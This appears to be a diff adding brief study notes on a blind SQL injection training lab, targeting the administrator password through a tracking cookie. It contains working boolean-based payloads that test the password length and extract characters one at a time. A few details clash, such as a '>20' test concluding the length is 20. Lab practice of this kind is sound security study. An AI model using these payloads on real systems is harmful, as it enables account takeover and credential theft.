@@ -1,0 +1,16 @@
+-Blind SQL injection with conditional responses
+Vulnerable parameter - tracking cookie
+Enumerate the password of the administrator
+Log in as the administrator user
+
+trackingId-5tzaUDMdyiniWxpV
+
+query-" select tracking-id from tracking_table where trackingId='5tzaUDMdyiniWxpV' and 1=1--' "
+
+' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--
+
+password is 20 character long
+
+' and (select substring(password,2,1) from users where username='administrator')='1'--
+starting charcter is 1.
+
